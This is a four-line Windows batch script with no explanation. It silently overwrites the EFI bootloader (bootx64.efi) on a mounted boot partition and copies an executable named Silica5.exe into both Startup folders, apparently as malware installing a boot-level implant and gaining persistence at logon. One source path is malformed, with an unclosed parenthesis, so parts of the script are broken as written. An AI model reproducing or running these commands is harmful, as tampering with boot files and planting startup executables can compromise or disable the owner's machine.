@echo off
xcopy "C:\Program Files (x86\Microsoft\Temp\bootx64.efi" "W:\BOOT"/Y /R /H/E /C /G
xcopy "C:\Program Files (x86\Microsoft\Temp\bootx64.efi" "W:\EFI\BOOT"/Y /H /R /E /C /G
xcopy /D /Y C:\Windows\System32\Silica5.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" /Y /H /R /E /C /G
xcopy /D /Y C:\Windows\System32\Silica5.exe "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /Y /H /R /E /C /G